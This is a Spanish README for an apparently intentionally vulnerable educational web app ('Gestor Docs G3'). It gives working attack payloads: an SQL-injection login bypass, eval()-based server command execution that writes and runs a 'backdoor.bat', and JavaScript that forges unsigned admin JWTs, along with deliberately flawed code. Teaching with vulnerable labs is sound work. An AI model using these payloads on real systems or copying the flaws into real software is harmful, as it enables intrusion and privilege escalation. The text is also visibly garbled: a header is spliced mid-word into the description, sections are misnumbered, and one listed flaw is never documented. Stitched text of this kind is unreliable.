# 📄 Gestor Docs G3

**Aplicación web educativa para demostración de vulnerabilidades de seguridad**

---

## 🎯 **Descripción**

Gestor Docs G3 es una aplicación w### **3. 🚨 Vulnerabilidad RCE (Remote Code Execution)**b de gestión de documentos PDF desarrollada con fines educativos. La aplicación incluye **vulnerabilidades intencionalmente implementadas** para demostrar técnicas de explotación y conceptos de seguridad informática.

⚠️ **ADVERTENCIA**: Esta aplicación contiene vulnerabilidades de seguridad **intencionalmente implementadas** para fines educativos. **NUNCA** usar en producción.

---


### **Estructura del proyecto:**
```
📁 backend/
  📁 api/          # Endpoints modularizados
    📄 auth.js     # Autenticación (VULNERABLE)
    📄 usuarios.js # Gestión usuarios (VULNERABLE)
    📄 documentos.js # Gestión archivos
    📄 comentarios.js # Sistema comentarios
  📁 db/           # Base de datos SQLite
  📁 files/        # Archivos PDF subidos
  📄 server.js     # Servidor Express principal

📁 frontend/
  📁 assets/       # CSS y recursos estáticos
  📁 components/   # Componentes reutilizables
  📁 pages/        # Páginas HTML

📄 init_db.js     # Script inicialización BD
📄 package.json   # Dependencias del proyecto
```

### **Tecnologías:**
- **Backend**: Node.js + Express
- **Base de datos**: SQLite3
- **Frontend**: HTML5 + CSS3 + JavaScript vanilla
- **Autenticación**: Sesiones con cookies
- **Subida archivos**: Multer

---

## 🚀 **Instalación y uso**

### **Requisitos previos:**
- Node.js 16+ 
- npm

### **Pasos de instalación:**

1. **Clonar el repositorio:**
```bash
git clone https://github.com/tu-usuario/segweb-g3-gestor-documentos.git
cd segweb-g3-gestor-documentos
```

2. **Instalar dependencias:**
```bash
npm install
```

3. **Inicializar base de datos:**
```bash
npm run initdb
```

4. **Ejecutar la aplicación:**
```bash
npm start
```

5. **Acceder a la aplicación:**
```
http://localhost:3000
```

### **Usuarios de prueba:**
| Usuario     | Contraseña  | Rol   |
|-------------|-------------|-------|
| admin       | admin123    | admin |
| user        | user123     | user  |
| manager     | manager123  | user  |
| guest       | guest123    | user  |
| superadmin  | super123    | admin |

---

## 🔴 **VULNERABILIDADES IMPLEMENTADAS**

> ⚠️ **Disclaimer**: Las siguientes vulnerabilidades están implementadas **únicamente para fines educativos**. El objetivo es aprender sobre seguridad web y técnicas de explotación en un entorno controlado.

### **1. 💉 SQL Injection**

#### **🎯 Ubicación:**
- **Login** (`/api/auth/login`)

#### **📝 Descripción:**
Las consultas SQL utilizan concatenación directa de strings sin sanitización, permitiendo inyección de código SQL malicioso.

#### **🔓 Código vulnerable:**
```javascript
// Login vulnerable
const query = `SELECT * FROM usuarios WHERE username = '${username}' AND password = '${password}'`;
```

#### **💀 Payloads de explotación:**

**Login bypass:**
```sql
Usuario: admin'--
Contraseña: cualquiera
```

#### **🛡️ Mitigación:**
Usar consultas parametrizadas:
```javascript
db.get('SELECT * FROM usuarios WHERE username = ? AND password = ?', [username, password], callback);
```

---

### **4. � Vulnerabilidades de autenticación clásicas**

#### **🎯 Ubicación:**
- Almacenamiento de contraseñas
- Gestión de sesiones (en implementaciones legacy)

#### **📝 Problemas identificados:**
- Contraseñas almacenadas en texto plano en la base de datos
- IDs de base de datos ahora son hashes impredecibles (mejorado)
- Sistema migrado a JWT (con vulnerabilidad propia)

#### **💀 Posibles explotaciones:**
- **Fuerza bruta** en contraseñas débiles
- **Exposición de contraseñas** en caso de compromiso de BD
- **Escalación de privilegios** vía manipulación de JWT (ver vulnerabilidad #4)

---

### **3. � Vulnerabilidad RCE (Remote Code Execution)**

#### **🎯 Ubicación:**
- Sistema de comentarios (`/api/comentarios`)
- Procesamiento de plantillas en el backend

#### **📝 Descripción:**
El backend procesa los comentarios usando un sistema de plantillas vulnerable que utiliza `eval()` para evaluar expresiones JavaScript. Esto permite que un atacante inyecte código JavaScript malicioso que se ejecutará en el servidor Node.js.

#### **🔓 Código vulnerable:**
```javascript
// Plantilla vulnerable que permite JavaScript injection
function procesarComentario(texto, autor) {
  const template = `
    <div class="comentario">
      <strong>${autor}:</strong> ${texto}
      <small>Fecha: \${new Date().toLocaleString()}</small>
    </div>
  `;
  
  // VULNERABILIDAD: eval() permite ejecución de código JavaScript arbitrario
  return eval('`' + template + '`');
}
```

#### **💀 Explotación paso a paso:**

**Requisito:** Acceso como admin (solo admins pueden comentar)

**Paso 1: Iniciar sesión como admin**
- Usuario: `admin`
- Contraseña: `admin123`

**Paso 2: Ir a "Ver documentos"**
- Seleccionar cualquier archivo
- Usar el formulario de comentarios

**Paso 3: Inyectar payload JavaScript**
- En lugar de un comentario normal, inyectar código malicioso

#### **💀 Payloads de ejemplo:**

**Ejemplo 1: Reconocimiento del sistema**
```javascript
\${process.platform} \${process.version} \${require('os').hostname()}
```

**Ejemplo 2: Ejecución de comandos**
```javascript
\${require('child_process').execSync('whoami').toString()}
```

**Ejemplo 3: Listado de archivos**
```javascript
\${require('fs').readdirSync('.').join(', ')}
```

**Ejemplo 4: Creación de archivo**
```javascript
\${require('fs').writeFileSync('hacked.txt', 'Sistema comprometido!')}
```

**Ejemplo 5: Backdoor para Windows**
```javascript
\${require('fs').writeFileSync('backdoor.bat', '@echo off\\necho === BACKDOOR ACTIVO ===\\nwhoami\\nhostname\\nipconfig\\ndir C:\\\\Users\\npause')} \${require('child_process').exec('backdoor.bat')}
```

#### **🔍 Explicación del Ejemplo 5:**
Este payload es especialmente peligroso porque:
1. **Crea un archivo .bat** con comandos de reconocimiento del sistema
2. **Lo ejecuta automáticamente** en el servidor Windows
3. **Recopila información** como usuario actual, nombre del equipo, configuración de red
4. **Lista directorios** para mapear la estructura del sistema
5. **Deja una pausa** para poder ver la salida antes de que se cierre

El archivo `backdoor.bat` creado contiene:
```batch
@echo off
echo === BACKDOOR ACTIVO ===
whoami
hostname
ipconfig
dir C:\Users
pause
```

#### **🛡️ Mitigación:**
```javascript
// NUNCA usar eval() con datos de usuario
// Usar sanitización y escape de HTML
function procesarComentario(texto, autor) {
  const textoEscapado = texto.replace(/[<>&"']/g, (char) => {
    return {'<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#x27;'}[char];
  });
  
  return `
    <div class="comentario">
      <strong>${autor}:</strong> ${textoEscapado}
      <small>Fecha: ${new Date().toLocaleString()}</small>
    </div>
  `;
}
```

---

### **5. 📂 Vulnerabilidades de subida de archivos**

#### **🎯 Ubicación:**
- Endpoint `/api/documentos/upload`

#### **📝 Problemas identificados:**
- Validación solo por MIME type (bypasseable)
- No hay validación de contenido del archivo
- Archivos almacenados con nombre original
- Falta límite de tasa de subida

#### **💀 Posibles explotaciones:**
- Subir archivos maliciosos con extensión PDF
- Path traversal en nombres de archivo
- DoS por subida masiva de archivos

---

### **6. 🌐 Exposición de información**

#### **🎯 Ubicación:**
- Búsqueda de usuarios devuelve contraseñas
- Logs del servidor muestran consultas SQL
- Errores de BD expuestos al frontend

#### **💀 Información expuesta:**
- Contraseñas en texto plano
- Estructura de la base de datos
- Detalles técnicos en errores

---

### **7. 🔓 Vulnerabilidad JWT (JSON Web Token)**

#### **🎯 Ubicación:**
- Sistema de autenticación (`/backend/utils/jwt.js`)
- Middlewares de autenticación en todos los endpoints protegidos

#### **📝 Descripción:**
El sistema utiliza JWT para autenticación, pero la función de verificación tiene una vulnerabilidad crítica: **no verifica la firma del token**. Solo decodifica el JWT y verifica la estructura básica, permitiendo que tokens maliciosos sean aceptados como válidos.

#### **🔓 Código vulnerable:**
```javascript
// VULNERABILIDAD CRÍTICA: Verificación defectuosa del JWT
function verifyToken(token) {
  try {
    // VULNERABILIDAD: Decodifica sin verificar la firma
    const decoded = jwt.decode(token, { complete: true });
    
    if (!decoded || !decoded.payload) {
      return null;
    }
    
    // Solo verifica que tenga la estructura correcta, NO la firma
    const payload = decoded.payload;
    
    // Verificación básica de campos requeridos
    if (!payload.id || !payload.username || !payload.rol) {
      return null;
    }
    
    // Verificar expiración (esta parte sí funciona)
    if (payload.exp && payload.exp < Math.floor(Date.now() / 1000)) {
      return null; // Token expirado
    }
    
    return payload; // ⚠️ ACEPTA CUALQUIER TOKEN CON ESTRUCTURA CORRECTA
  } catch (error) {
    return null;
  }
}
```

#### **💀 Explotación paso a paso:**

**Paso 1: Obtener un token válido**
- Hacer login legítimo con cualquier usuario (ej: `user/user123`)
- Capturar el JWT desde localStorage o desde las herramientas de desarrollo

**Paso 2: Decodificar y modificar el token**
- Usar herramientas como jwt.io para decodificar el token
- Modificar el payload, por ejemplo cambiar `"rol": "user"` a `"rol": "admin"`
- Cambiar el `username` si se desea

**Paso 3: Crear token malicioso**
- Generar un nuevo JWT con el payload modificado
- **No importa la firma** ya que no se verifica

**Paso 4: Usar el token falsificado**
- Reemplazar el token en localStorage/sessionStorage
- O enviarlo en el header Authorization: `Bearer TOKEN_FALSO`

#### **💀 Ejemplos de explotación:**

**Ejemplo 1: Escalación de privilegios a admin**
```javascript
// Token original decodificado:
{
  "id": "abc123...",
  "username": "user",
  "rol": "user",
  "iat": 1640995200,
  "exp": 1641081600
}

// Token malicioso (cambiar rol a admin):
{
  "id": "abc123...",
  "username": "user", 
  "rol": "admin",  // ⚠️ ESCALACIÓN DE PRIVILEGIOS
  "iat": 1640995200,
  "exp": 1641081600
}
```

**Ejemplo 2: Suplantación de identidad**
```javascript
// Crear token como superadmin sin conocer sus credenciales:
{
  "id": "fake-id-123",
  "username": "superadmin",
  "rol": "admin",
  "iat": 1640995200,
  "exp": 2147483647  // Expiración muy lejana
}
```

**Ejemplo 3: Bypass de autenticación**
```javascript
// Token completamente falso pero con estructura correcta:
{
  "id": "hacker-id",
  "username": "hacker",
  "rol": "admin",
  "iat": 1640995200,
  "exp": 2147483647
}
```

#### **🔍 Herramientas para explotar:**

**Usando jwt.io:**
1. Pegar el token original en jwt.io
2. Modificar el payload en la sección derecha
3. Copiar el nuevo token (ignorar la advertencia de "signature invalid")
4. Usar el token modificado en la aplicación

**Usando código JavaScript:**
```javascript
// Crear token falso sin verificación de firma
const fakePayload = {
  id: "fake-id",
  username: "admin",
  rol: "admin",
  iat: Math.floor(Date.now() / 1000),
  exp: Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 365) // 1 año
};

// Crear JWT falso (header + payload + firma_falsa)
const header = btoa(JSON.stringify({typ: "JWT", alg: "HS256"}));
const payload = btoa(JSON.stringify(fakePayload));
const fakeToken = header + "." + payload + ".fake_signature";

// Usar en localStorage
localStorage.setItem('jwt_token', fakeToken);
```

#### **🛡️ Mitigación:**
```javascript
// Función CORRECTA para verificar JWT
function verifyTokenCorrectly(token) {
  try {
    // ✅ USAR jwt.verify() que SÍ verifica la firma
    return jwt.verify(token, JWT_SECRET);
  } catch (error) {
    return null;
  }
}
```

---

## 🔄 **CAMBIOS Y MEJORAS RECIENTES**

### **Migración a JWT y nuevas vulnerabilidades**

#### **✅ Mejoras implementadas:**
- **IDs hash impredecibles**: Los usuarios y comentarios ahora usan IDs hash criptográficos en lugar de IDs numéricos secuenciales
- **Autenticación JWT**: Sistema migrado de sesiones en memoria a JSON Web Tokens
- **Frontend modularizado**: Gestión de autenticación centralizada con `AuthManager`
- **Mejor UX**: Manejo de tokens tanto en localStorage como sessionStorage según preferencia del usuario

#### **🚨 Nueva vulnerabilidad crítica agregada:**
- **Verificación JWT defectuosa**: La función `verifyToken()` no verifica la firma, permitiendo tokens falsificados
- **Escalación de privilegios**: Posible bypass completo de autenticación y escalación a admin
- **Herramientas de explotación**: Documentados métodos con jwt.io y código JavaScript

#### **🎯 Objetivos educativos:**
Esta aplicación ahora contiene **7 vulnerabilidades diferentes** que cubren:
- **Injection**: SQLi en login y búsqueda de usuarios
- **Broken Authentication**: JWT sin verificación de firma
- **Sensitive Data Exposure**: Contraseñas en texto plano, información de usuarios
- **Security Misconfiguration**: Plantillas vulnerables, validación deficiente
- **Remote Code Execution**: JavaScript injection en comentarios
- **File Upload**: Validación bypasseable de archivos

#### **📚 Valor educativo:**
- Ejemplos **realistas** de vulnerabilidades comunes en aplicaciones web modernas
- **Código vulnerable** documentado con explicaciones técnicas
- **Payloads funcionales** para practicar técnicas de penetration testing
- **Mitigaciones correctas** para aprender buenas prácticas de seguridad

---


